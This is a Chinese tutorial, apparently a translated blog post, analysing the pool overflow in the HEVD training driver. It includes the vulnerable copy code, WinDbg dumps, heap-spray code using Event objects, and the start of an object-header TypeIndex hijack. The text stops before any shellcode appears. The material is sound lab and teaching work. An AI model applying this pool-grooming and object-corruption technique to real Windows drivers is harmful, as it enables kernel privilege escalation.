# HEVD池溢出分析

阅读量 **306513**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-01-29 15:35:09

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t01ea698624a6210ca8.png)

## 环境准备

Win 10 64位 主机 + win 7 32位虚拟机

Windbg：调试器

VirtualKD-3.0：双击调试工具

InstDrv：驱动安装，运行工具

HEVD：一个Windows内核漏洞训练项目，里面几乎涵盖了内核可能存在的所有漏洞类型，非常适合我们熟悉理解Windows内核漏洞的原理，利用技巧等等

## windows内核池简介

想要研究windows内核漏洞，需要对windows池有一定的认识，其管理结构、分配、释放都需要有很深的了解。这里我不会详细介绍池的一些知识，只推荐一些网站以供参考。

<https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf>

<https://www.cnblogs.com/flycat-2016/p/5449738.html>

下面给一个内核pool page的图，知道这个图，对于该池漏洞的分析，基本足够。

![](https://p3.ssl.qhimg.com/t01498e84bb1a78a93a.png)

Windows内核中有很多以4k为单位的pool page，每个pool page会被划分为大小不一的pool chunk以供内核程序使用。每个pool
chunk有一个pool header结构（8个字节大小），用来描述pool chunk的一些基本信息。

Pool header结构如下：

    
    
    kd> dt nt!_POOL_HEADER
    
       +0x000 PreviousSize     : Pos 0, 9 Bits
    
       +0x000 PoolIndex        : Pos 9, 7 Bits
    
       +0x002 BlockSize        : Pos 0, 9 Bits
    
       +0x002 PoolType         : Pos 9, 7 Bits
    
       +0x000 Ulong1           : Uint4B
    
       +0x004 PoolTag          : Uint4B
    
       +0x004 AllocatorBackTraceIndex : Uint2B
    
       +0x006 PoolTagHash      : Uint2B

当我们运行代码：

    
    
    KernelBuffer = ExAllocatePoolWithTag(NonPagedPool,
    
                                                 (SIZE_T)POOL_BUFFER_SIZE,
    
                                                 (ULONG)POOL_TAG);

该函数回返回一个pool chunk，返回的地址KernelBuffer = pool header +
8的空间。也就是说我们返回的空间前面有8个字节的头部，只是我们看不到。Pool header
后面紧跟的是我们的数据，当我们的数据过程长时，就会向下覆盖到其他chunk。

## HEVD池漏洞代码分析

漏洞代码如下：

    
    
    #define POOL_BUFFER_SIZE 504
    
        __try {
    
            DbgPrint("[+] Allocating Pool chunk\n");
    
    
    
            // Allocate Pool chunk
    
            KernelBuffer = ExAllocatePoolWithTag(NonPagedPool,
    
                                                 (SIZE_T)POOL_BUFFER_SIZE,
    
                                                 (ULONG)POOL_TAG);
    
    
    
            if (!KernelBuffer) {
    
                // Unable to allocate Pool chunk
    
                DbgPrint("[-] Unable to allocate Pool chunk\n");
    
    
    
                Status = STATUS_NO_MEMORY;
    
                return Status;
    
            }
    
            else {
    
                DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
    
                DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));
    
                DbgPrint("[+] Pool Size: 0x%X\n", (SIZE_T)POOL_BUFFER_SIZE);
    
                DbgPrint("[+] Pool Chunk: 0x%p\n", KernelBuffer);
    
            }
    
    
    
            // Verify if the buffer resides in user mode
    
            ProbeForRead(UserBuffer, (SIZE_T)POOL_BUFFER_SIZE, (ULONG)__alignof(UCHAR));
    
    
    
            DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
    
            DbgPrint("[+] UserBuffer Size: 0x%X\n", Size);
    
            DbgPrint("[+] KernelBuffer: 0x%p\n", KernelBuffer);
    
            DbgPrint("[+] KernelBuffer Size: 0x%X\n", (SIZE_T)POOL_BUFFER_SIZE);
    
    
    
    #ifdef SECURE
    
            // Secure Note: This is secure because the developer is passing a size
    
            // equal to size of the allocated Pool chunk to RtlCopyMemory()/memcpy().
    
            // Hence, there will be no overflow
    
            RtlCopyMemory(KernelBuffer, UserBuffer, (SIZE_T)POOL_BUFFER_SIZE);
    
    #else
    
            DbgPrint("[+] Triggering Pool Overflow\n");
    
    
    
            // Vulnerability Note: This is a vanilla Pool Based Overflow vulnerability
    
            // because the developer is passing the user supplied value directly to
    
            // RtlCopyMemory()/memcpy() without validating if the size is greater or
    
            // equal to the size of the allocated Pool chunk
    
            RtlCopyMemory(KernelBuffer, UserBuffer, Size);
    
    #endif
    
    
    
            if (KernelBuffer) {
    
                DbgPrint("[+] Freeing Pool chunk\n");
    
                DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
    
                DbgPrint("[+] Pool Chunk: 0x%p\n", KernelBuffer);
    
    
    
                // Free the allocated Pool chunk
    
                ExFreePoolWithTag(KernelBuffer, (ULONG)POOL_TAG);
    
                KernelBuffer = NULL;
    
            }
    
        }
    
        __except (EXCEPTION_EXECUTE_HANDLER) {
    
            Status = GetExceptionCode();
    
            DbgPrint("[-] Exception Code: 0x%X\n", Status);
    
        }

其中UserBuffer，Size的获取方式如下：

    
    
    UserBuffer = IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;
    
    Size = IrpSp->Parameters.DeviceIoControl.InputBufferLength;

我们看上面的代码，首先调用

    
    
    ExAllocatePoolWithTag(NonPagedPool, (SIZE_T) POOL_BUFFER_SIZE, (ULONG)POOL_TAG);

申请一个固定大小的非分页池，然后调用拷贝函数，将ring3级传入的数据拷贝到申请的pool chunk中。

    
    
    RtlCopyMemory(KernelBuffer, UserBuffer, Size);

这里KernelBuffer是固定长度，
UserBuffer和Size都是我们ring3级可控的，当我们的size大于POOL_BUFFER_SIZE时，就会造成溢出，覆盖到下面的pool
chunk。

## 漏洞跟踪调试

Windbg下断点Bp HEVD!TriggerPoolOverflow，
因为驱动是我自己编译的，有符号文件，所以这里我直接对函数名下断点，如果你是直接从网上下载的驱动，那么你需要自己找该函数对应的偏移。

当函数执行完

    
    
            KernelBuffer = ExAllocatePoolWithTag(NonPagedPool,
    
                                                 (SIZE_T)POOL_BUFFER_SIZE,
    
                                                 (ULONG)POOL_TAG);

后，得KernelBuffer = 0x8745dd88，所以可知kernelbuffer所在的pool chunk的地址为0x8745dd88–8 =
0x8745dd80。

    
    
    kd> !pool 0x8745dd88
    
    Pool page 8745dd88 region is Nonpaged pool
    
     8745d000 size:  988 previous size:    0  (Allocated)  Devi (Protected)
    
     8745d988 size:    8 previous size:  988  (Free)       File
    
     8745d990 size:   c8 previous size:    8  (Allocated)  Ntfx
    
     8745da58 size:   90 previous size:   c8  (Allocated)  MmCa
    
     8745dae8 size:  168 previous size:   90  (Allocated)  CcSc
    
     8745dc50 size:   b8 previous size:  168  (Allocated)  File (Protected)
    
     8745dd08 size:    8 previous size:   b8  (Free)       usbp
    
     8745dd10 size:   68 previous size:    8  (Allocated)  EtwR (Protected)
    
     8745dd78 size:    8 previous size:   68  (Free)       XSav
    
    *8745dd80 size:  200 previous size:    8  (Allocated) *Hack
    
         Owning component : Unknown (update pooltag.txt)
    
     8745df80 size:   80 previous size:  200  (Free )  MmRl

可以看出，pool page 是以1000h即4kb为单位的， 里面每个都是pool chunk。

下面观察一个标记为free的pool chunk。 地址为 8745d988

    
    
    kd> dd 8745d988
    
    8745d988  00010131 e56c6946 04190001 7866744e
    
    8745d998  00bc0743 00000001 00000000 00000000
    
    8745d9a8  00040001 00000000 8745d9b0 8745d9b0
    
    8745d9b8  00000000 8745da1c 87336164 00000000
    
    8745d9c8  00000000 00000000 00000000 00000000
    
    8745d9d8  00000000 00000000 00000000 00000000
    
    8745d9e8  00000000 00000000 00000000 00280707
    
    8745d9f8  00000000 00000000 00000000 00000000
    
    
    
    kd> dt nt!_POOL_HEADER 8745d988
    
       +0x000 PreviousSize     : 0y100110001 (0x131)
    
       +0x000 PoolIndex        : 0y0000000 (0)
    
       +0x002 BlockSize        : 0y000000001 (0x1)
    
       +0x002 PoolType         : 0y0000000 (0)
    
       +0x000 Ulong1           : 0x10131
    
       +0x004 PoolTag          : 0xe56c6946
    
       +0x004 AllocatorBackTraceIndex : 0x6946
    
       +0x006 PoolTagHash      : 0xe56c

PreviousSize 前一个chunk大小，对应的值为0x131, 根据ListHeads数组可知， 0x131对应chunk大小为 0x131 * 8
= 0x988

BlockSize 对应本chunk大小， 对应的值为0x1， 根据ListHeads数组可知， 0x1对应chunk大小为 0x1 * 8 = 0x8

PoolType = 0 表示free。

这里不懂也没关系。

再看看我们申请的pool块， 函数返回的地址为0x8745dd88，块头地址为0x8745dd80， 所以返回的真正存放数据的地址为PoolHeader +
8

即0x8745dd80 + 8 = 0x8745dd88

    
    
    kd> dd 8745dd80
    
    8745dd80  04400001 6b636148 00000000 0000001b
    
    8745dd90  083e0003 c3504c41 88129210 00000148
    
    8745dda0  183c0005 6770534e 85aad038 00000000
    
    8745ddb0  8745dde4 0000000a 00000001 00000001
    
    8745ddc0  8745ddfc 00000018 8745deec 00000018
    
    8745ddd0  8745de8c 00000008 8745debc 00000008
    
    8745dde0  00000004 00000018 00000001 eb004a01
    
    8745ddf0  11d49b1a 50002391 bc597704 00000000
    
    kd> dt nt!_POOL_HEADER 8745dd80
    
       +0x000 PreviousSize     : 0y000000001 (0x1)
    
       +0x000 PoolIndex        : 0y0000000 (0)
    
       +0x002 BlockSize        : 0y001000000 (0x40)
    
       +0x002 PoolType         : 0y0000010 (0x2)
    
       +0x000 Ulong1           : 0x4400001
    
       +0x004 PoolTag          : 0x6b636148
    
       +0x004 AllocatorBackTraceIndex : 0x6148
    
       +0x006 PoolTagHash      : 0x6b63

PoolType为0x2, 表示Allocated， 空间被使用， 由dd 8745dd80可知，

0x8745dd88 开始后的数据并不是全0， 也就是ExAllocatePoolWithTag申请空间时，并不会做初始化工作。

    
    
    //memset(UserModeBuffer, 0x41, 504);
    
    RtlCopyMemory(KernelBuffer, UserBuffer, Size);

当执行RtlCopyMemory后，0x8745dd88开始的数据将会被A覆盖

    
    
    kd> dd 8745dd80 L100
    
    8745dd80  04400001 6b636148 41414141 41414141
    
    8745dd90  41414141 41414141 41414141 41414141
    
    8745dda0  41414141 41414141 41414141 41414141
    
    8745ddb0  41414141 41414141 41414141 41414141
    
    8745ddc0  41414141 41414141 41414141 41414141
    
    8745ddd0  41414141 41414141 41414141 41414141
    
    8745dde0  41414141 41414141 41414141 41414141
    
    8745ddf0  41414141 41414141 41414141 41414141
    
    8745de00  41414141 41414141 41414141 41414141
    
    8745de10  41414141 41414141 41414141 41414141
    
    8745de20  41414141 41414141 41414141 41414141
    
    8745de30  41414141 41414141 41414141 41414141
    
    8745de40  41414141 41414141 41414141 41414141
    
    8745de50  41414141 41414141 41414141 41414141
    
    8745de60  41414141 41414141 41414141 41414141
    
    8745de70  41414141 41414141 41414141 41414141
    
    8745de80  41414141 41414141 41414141 41414141
    
    8745de90  41414141 41414141 41414141 41414141
    
    8745dea0  41414141 41414141 41414141 41414141
    
    8745deb0  41414141 41414141 41414141 41414141
    
    8745dec0  41414141 41414141 41414141 41414141
    
    8745ded0  41414141 41414141 41414141 41414141
    
    8745dee0  41414141 41414141 41414141 41414141
    
    8745def0  41414141 41414141 41414141 41414141
    
    8745df00  41414141 41414141 41414141 41414141
    
    8745df10  41414141 41414141 41414141 41414141
    
    8745df20  41414141 41414141 41414141 41414141
    
    8745df30  41414141 41414141 41414141 41414141
    
    8745df40  41414141 41414141 41414141 41414141
    
    8745df50  41414141 41414141 41414141 41414141
    
    8745df60  41414141 41414141 41414141 41414141
    
    8745df70  41414141 41414141 41414141 41414141
    
    8745df80  08100040 6c526d4d 00000000 87487398
    
    8745df90  00000000 8745df94 8745df94 00000004
    
    8745dfa0  00000005 ffffffff 00000000 00000000
    
    8745dfb0  00000000 8745dfb4 8745dfb4 00000000
    
    8745dfc0  00000000 00000000 00000000 8745dfcc
    
    8745dfd0  8745dfcc 00000004 00000465 87ef35e8
    
    8745dfe0  88097ae0 00000000 00000000 00000000
    
    8745dff0  00000000 00000000 00000000 87f32380
    
    8745e000  01010129 00000000 00055400 0003023f
    
    8745e010  00000000 00055420 00030240 00000000
    
    ---------------------------------------------------------    
    char UserModeBuffer[512 + 8] = { 0x41 };
    
    memset(UserModeBuffer, 0x41, 512);
    
    memset(UserModeBuffer + 512, 0x42, 8);
    
    UserModeBufferSize = 512 + 8;

如果UserModeBuffer空间大于ExAllocatePoolWithTag所申请的空间，
在执行RtlCopyMemory(KernelBuffer, UserBuffer, Size);

时就会覆盖下一个pool chunk的相关信息

下一个chunk被覆盖前后的数据（由于重新运行了程序，所有地址和上面不一样了）

    
    
    kd> dd 8818d610
    
    8818d610  085f0040 70627375 88335fb8 00000000
    
    8818d620  00000000 00000000 00000000 00000000
    
    8818d630  43787254 00000000 00000000 000000c8
    
    8818d640  077415ad 00000000 00000000 0000020a
    
    8818d650  0000000f 000002f0 000002cc 00000003
    
    8818d660  00000001 00000000 6f6d7455 86378028
    
    8818d670  00000000 00000000 00000000 00000000
    
    8818d680  00000000 00000000 00000000 00000000
    
    kd> dt nt!_POOL_HEADER  8818d610
    
       +0x000 PreviousSize     : 0y001000000 (0x40)
    
       +0x000 PoolIndex        : 0y0000000 (0)
    
       +0x002 BlockSize        : 0y001011111 (0x5f)
    
       +0x002 PoolType         : 0y0000100 (0x4)
    
       +0x000 Ulong1           : 0x85f0040
    
       +0x004 PoolTag          : 0x70627375
    
       +0x004 AllocatorBackTraceIndex : 0x7375
    
       +0x006 PoolTagHash      : 0x706

覆盖后

    
    
    kd> dt nt!_POOL_HEADER  8818d610
    
       +0x000 PreviousSize     : 0y101000001 (0x141)
    
       +0x000 PoolIndex        : 0y0100000 (0x20)
    
       +0x002 BlockSize        : 0y101000001 (0x141)
    
       +0x002 PoolType         : 0y0100000 (0x20)
    
       +0x000 Ulong1           : 0x41414141
    
       +0x004 PoolTag          : 0x41414141
    
       +0x004 AllocatorBackTraceIndex : 0x4141
    
       +0x006 PoolTagHash      : 0x4141
    
    kd> dd 8818d610
    
    8818d610  41414141 41414141 42424242 42424242
    
    8818d620  00000000 00000000 00000000 00000000
    
    8818d630  43787254 00000000 00000000 000000c8
    
    8818d640  077415ad 00000000 00000000 0000020a
    
    8818d650  0000000f 000002f0 000002cc 00000003
    
    8818d660  00000001 00000000 6f6d7455 86378028
    
    8818d670  00000000 00000000 00000000 00000000
    
    8818d680  00000000 00000000 00000000 00000000

再继续运行的话，系统蓝屏

## 漏洞利用

内核池类似于windows中的堆，用来动态分配内存，因为有漏洞的用户缓冲区分配在非分页池上，所以我们需要一些技术来控制修改非分页池。这种技术就是堆喷技术，如果之前你没接触内核堆喷，没关系，往下看就行了。

Windows 提供了一种[Event](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682655\(v=vs.85\).aspx)对象,
该对象存储在非分页池中，可以使用[CreateEvent](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682396\(v=vs.85\).aspx) API 来创建：

    
    
    HANDLE WINAPI CreateEvent(
    
      _In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes,
    
      _In_     BOOL                  bManualReset,
    
      _In_     BOOL                  bInitialState,
    
      _In_opt_ LPCTSTR               lpName
    
    );

在这里我们需要用这个API创建两个足够大的Event对象数组，然后通过使用[CloseHandle](https://bbs.pediy.com/closehandle)
API 释放某些Event 对象，从而在分配的池块中造成空隙，经合并形成更大的空闲块:

    
    
    BOOL WINAPI CloseHandle(
    
      _In_ HANDLE hObject
    
    );

下面我们具体跟踪观察下，就明白了。

    
    
        //heap spray
    
        HANDLE spray_event1[10000] = { NULL };
    
        HANDLE spray_event2[5000] = { NULL };
    
    
    
        for (int i = 0; i < 10000; i++)
    
        {
    
            spray_event1[i] = CreateEventA(NULL, FALSE, FALSE, NULL);
    
        }
    
    
    
        for (int j = 0; j < 5000; j++)
    
        {
    
            spray_event2[j] = CreateEventA(NULL, FALSE, FALSE, NULL);
    
        }
    
       
    
        for (int i = 5000-1; i >= 4989; i--)
    
        {
    
            printf("%x\n", spray_event2[i]);
    
    }

如上构造堆喷代码，最后把后面的事件句柄打印出来，方便我们观察池结构。

    
    
    kd> !handle eafc
    
    PROCESS 85a54030  SessionId: 1  Cid: 0a0c    Peb: 7ffdf000  ParentCid: 05e8
    
        DirBase: bebcd580  ObjectTable: a6088008  HandleCount: 15010.
    
        Image: MyExploitForHevd.exe
    
    Handle table at a6088008 with 15010 entries in use
    
    eafc: Object: 85b33930  GrantedAccess: 001f0003 Entry: a5ada5f8
    
    Object: 85b33930  Type: (85763418) Event
    
        ObjectHeader: 85b33918 (new version)
    
            HandleCount: 1  PointerCount: 1
    
    
    
    kd> !pool 85b33930
    
    Pool page 85b33930 region is Nonpaged pool
    
     85b33000 size:   40 previous size:    0  (Allocated)  Even (Protected)
    
     85b33040 size:  290 previous size:   40  (Free)       ...@
    
     85b332d0 size:   40 previous size:  290  (Allocated)  SeTl
    
     85b33310 size:  2f8 previous size:   40  (Allocated)  usbp
    
     85b33608 size:  2f8 previous size:  2f8  (Allocated)  usbp
    
    *85b33900 size:   40 previous size:  2f8  (Allocated) *Even (Protected)
    
         Pooltag Even : Event objects
    
     85b33940 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33980 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b339c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33a00 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33a40 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33a80 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33ac0 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33b00 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33b40 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33b80 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33bc0 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33c00 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33c40 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33c80 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33cc0 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33d00 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33d40 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33d80 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33dc0 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33e00 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33e40 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33e80 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33ec0 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33f00 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33f40 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33f80 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b33fc0 size:   40 previous size:   40  (Allocated)  Even (Protected)

如上观察，Even占据着大量的pool page，每个大小0x40。

我们申请的池大小为504，再加上8个字节的pool header， 504+8=512=0x200=0x40*8, 刚好8个event
chunk的大小，这也是我们选择event内核对象的原因。

下面我们看看如何制造堆喷缝隙：

    
    
        //制造堆喷区空洞, 目的使我们的数据分配到空洞上;
    
        for (int i = 0; i < 5000; i = i + 16)
    
        {
    
            for (int j = 0; j < 8; j++)
    
            {
    
                //一个event对象大小0x40,  0x200的空间需要8个event对象;
    
                CloseHandle(spray_event2[i + j]);
    
            }
    
    }

运行代码，我们再次看看pool page的结构：

    
    
    kd> !pool 85b32d70
    
    Pool page 85b32d70 region is Nonpaged pool
    
     85b32000 size:  2f8 previous size:    0  (Allocated)  usbp
    
     85b322f8 size:  510 previous size:  2f8  (Free)       ."..
    
     85b32808 size:  2f8 previous size:  510  (Allocated)  usbp
    
     85b32b00 size:   40 previous size:  2f8  (Free )  Even (Protected)
    
     85b32b40 size:   40 previous size:   40  (Free )  Even (Protected)
    
     85b32b80 size:   40 previous size:   40  (Free )  Even (Protected)
    
     85b32bc0 size:   40 previous size:   40  (Free )  Even (Protected)
    
     85b32c00 size:   40 previous size:   40  (Free )  Even (Protected)
    
     85b32c40 size:   40 previous size:   40  (Free )  Even (Protected)
    
     85b32c80 size:   40 previous size:   40  (Free )  Even (Protected)
    
     85b32cc0 size:   40 previous size:   40  (Free)       Even
    
     85b32d00 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
    *85b32d40 size:   40 previous size:   40  (Allocated) *Even (Protected)
    
         Pooltag Even : Event objects
    
     85b32d80 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b32dc0 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b32e00 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b32e40 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b32e80 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b32ec0 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b32f00 size:  100 previous size:   40  (Free)       Even

如上所示，在我们调用CloseHandle关闭大量事件句柄后，内核池页上出现了大量的空洞。大小为0x40*8=0x200,当我们再次申请0x200大小的空间时，就有很大的概率落在这些空洞上。

此次申请的KernelBuffer = 0x85b108c8，我们看下其位置

    
    
    kd> !pool 0x85b108c8
    
    Pool page 85b108c8 region is Nonpaged pool
    
     85b10000 size:   40 previous size:    0  (Allocated)  Even (Protected)
    
     85b10040 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b10080 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b100c0 size:  200 previous size:   40  (Free)       Even（8个一组的缝隙）
    
     85b102c0 size:   40 previous size:  200  (Allocated)  Even (Protected)
    
     85b10300 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b10340 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b10380 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b103c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b10400 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b10440 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b10480 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b104c0 size:  200 previous size:   40  (Free)       Even（8个一组的缝隙）
    
     85b106c0 size:   40 previous size:  200  (Allocated)  Even (Protected)
    
     85b10700 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b10740 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b10780 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b107c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b10800 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b10840 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b10880 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
    *85b108c0 size:  200 previous size:   40  (Allocated) *Hack
    
            Owning component : Unknown (update pooltag.txt)
    
     85b10ac0 size:   40 previous size:  200  (Allocated)  Even (Protected)
    
     85b10b00 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b10b40 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b10b80 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b10bc0 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b10c00 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b10c40 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b10c80 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b10cc0 size:   c0 previous size:   40  (Free)       Even
    
     85b10d80 size:  140 previous size:   c0  (Allocated)  Io   Process: 873d9478
    
     85b10ec0 size:   40 previous size:  140  (Allocated)  Even (Protected)
    
     85b10f00 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b10f40 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b10f80 size:   40 previous size:   40  (Allocated)  Even (Protected)
    
     85b10fc0 size:   40 previous size:   40  (Allocated)  Even (Protected)

可知其刚好落在了构造的堆喷空隙中。

所以我们向下覆盖数据时，会覆盖event对象的一些结构，我们接下来看下如果通过event对象来达到控制程序流程，执行我们的shellcode。

Windows系统的各种资源以对象（Object）的形式来组织，例如File Object, Driver Object, Device
Object等等，但实际上这些所谓的“对象”在系统的对象管理器（Object Manager）看来只是完整对象的一个部分——对象实体（Object
Body）

一个内核对象有三部分组成，

首先是

    
    
    kd> dt nt!_OBJECT_HEADER_QUOTA_INFO
    
       +0x000 PagedPoolCharge  : Uint4B
    
       +0x004 NonPagedPoolCharge : Uint4B
    
       +0x008 SecurityDescriptorCharge : Uint4B
    
       +0x00c SecurityDescriptorQuotaBlock : Ptr32 Void

一个对象可以包含全部四个结构，也可能只包含其中的某个。

之后是OBJECT_HEADER结构，

    
    
    kd> dt nt!_OBJECT_HEADER
    
       +0x000 PointerCount     : Int4B
    
       +0x004 HandleCount      : Int4B
    
       +0x004 NextToFree       : Ptr32 Void
    
       +0x008 Lock             : _EX_PUSH_LOCK
    
       +0x00c TypeIndex        : UChar
    
       +0x00d TraceFlags       : UChar
    
       +0x00e InfoMask         : UChar
    
       +0x00f Flags            : UChar
    
       +0x010 ObjectCreateInfo : Ptr32 _OBJECT_CREATE_INFORMATION
    
       +0x010 QuotaBlockCharged : Ptr32 Void
    
       +0x014 SecurityDescriptor : Ptr32 Void
    
       +0x018 Body

最后是对象体， 不同内核对象，对象体不同。

例如： DRIVER_OBJECT, DEVICE_OBJECT, FILE_OBJECT等

CreateEvent创建事件对象时，事件对象在内核中是存放在pool chunk中的， 结构为：

—————————

|PoolHeader |

————————–

|_OBJECT_HEADER_QUOTA_INFO|

—————————

|_OBJECT_HEADER |

—————————

|Body(对象体) |

—————————

这里我们关心的是_OBJECT_HEADER中的TypeIndex值，这个值是全局数组ObTypeIndexTable的索引。ObTypeIndexTable
存放有关各种“对象类型”的信息。

我们看下我们分配的chunk后面一个event结构信息，地址为85b10ac0，

其_OBJECT_HEADER数据为：

    
    
    kd> dt nt!_OBJECT_HEADER 85b10ac0+8+10 .
    
       +0x000 PointerCount     : 0n1
    
       +0x004 HandleCount      : 0n1
    
       +0x004 NextToFree       :
    
       +0x008 Lock             :
    
          +0x000 Locked           : 0y0
    
          +0x000 Waiting          : 0y0
    
          +0x000 Waking           : 0y0
    
          +0x000 MultipleShared   : 0y0
    
          +0x000 Shared           : 0y0000000000000000000000000000 (0)
    
          +0x000 Value            : 0
    
          +0x000 Ptr              : (null)
    
       +0x00c TypeIndex        : 0xc ''
    
       +0x00d TraceFlags       : 0 ''
    
       +0x00e InfoMask         : 0x8 ''
    
       +0x00f Flags            : 0 ''
    
       +0x010 ObjectCreateInfo :
    
       +0x010 QuotaBlockCharged :
    
       +0x014 SecurityDescriptor :
    
       +0x018 Body             :
    
          +0x000 UseThisFieldToCopy : 0n262145
    
          +0x000 DoNotUseThisField : 1.2951683872905357532e-318

可以看到该event对象OBJECT_HEADER的TypeIndex为0xc,其类型信息放在ObTypeIndexTable[0xc]中

    
    
    kd>  dd nt!ObTypeIndexTable
    
    82b8a900  00000000 bad0b0b0 8564e900 8564e838
    
    82b8a910  8564e770 8564e570 856ee040 856eef78
    
    82b8a920  856eeeb0 856eede8 856eed20 856ee6a0
    
    82b8a930  85763418 8571f878 856fb430 856fb368
    
    82b8a940  8570f430 8570f368 8575b448 8575b380
    
    82b8a950  8576b450 8576b388 857539c8 85753900
    
    82b8a960  85753838 856ef7a8 856ef6e0 856ef618
    
    82b8a970  856f39b8 856f34f0 856f3428 8573df78

可以看到，ObTypeIndexTable数组的第一项为0，没有使用，却为我们执行shellcode提供了机会。

第0xc项内容如下：

    
    
    kd> dt nt!_OBJECT_TYPE 85763418 .
    
       +0x000 TypeList         :  [ 0x85763418 - 0x85763418 ]
    
          +0x000 Flink            : 0x85763418 _LIST_ENTRY [ 0x85763418 - 0x85763418 ]
    
          +0x004 Blink            : 0x85763418 _LIST_ENTRY [ 0x85763418 - 0x85763418 ]
    
       +0x008 Name             :  "Event"
    
          +0x000 Length           : 0xa
    
          +0x002 MaximumLength    : 0xc
    
          +0x004 Buffer           : 0x8c605570  "Event"
    
       +0x010 DefaultObject    :
    
       +0x014 Index            : 0xc ''
    
       +0x018 TotalNumberOfObjects : 0x3c66
    
       +0x01c TotalNumberOfHandles : 0x3ca0
    
       +0x020 HighWaterNumberOfObjects : 0x4827
    
       +0x024 HighWaterNumberOfHandles : 0x487c
    
       +0x028 TypeInfo         :
    
          +0x000 Length           : 0x50
    
          +0x002 ObjectTypeFlags  : 0 ''
    
          +0x002 CaseInsensitive  : 0y0
    
          +0x002 UnnamedObjectsOnly : 0y0
    
          +0x002 UseDefaultObject : 0y0
    
          +0x002 SecurityRequired : 0y0
    
          +0x002 MaintainHandleCount : 0y0
    
          +0x002 MaintainTypeList : 0y0
    
          +0x002 SupportsObjectCallbacks : 0y0
    
          +0x004 ObjectTypeCode   : 2
    
          +0x008 InvalidAttributes : 0x100
    
          +0x00c GenericMapping   : _GENERIC_MAPPING
    
          +0x01c ValidAccessMask  : 0x1f0003
    
          +0x020 RetainAccess     : 0
    
          +0x024 PoolType         : 0 ( NonPagedPool )
    
          +0x028 DefaultPagedPoolCharge : 0
    
          +0x02c DefaultNonPagedPoolCharge : 0x40
    
          +0x030 DumpProcedure    : (null)
    
          +0x034 OpenProcedure    : (null)
    
          +0x038 CloseProcedure   : (null)
    
          +0x03c DeleteProcedure  : (null)
    
          +0x040 ParseProcedure   : (null)
    
          +0x044 SecurityProcedure : 0x82cac5b6        long  nt!SeDefaultObjectMethod+0
    
          +0x048 QueryNameProcedure : (null)
    
          +0x04c OkayToCloseProcedure : (null)
    
       +0x078 TypeLock         :
    
          +0x000 Locked           : 0y0
    
          +0x000 Waiting          : 0y0
    
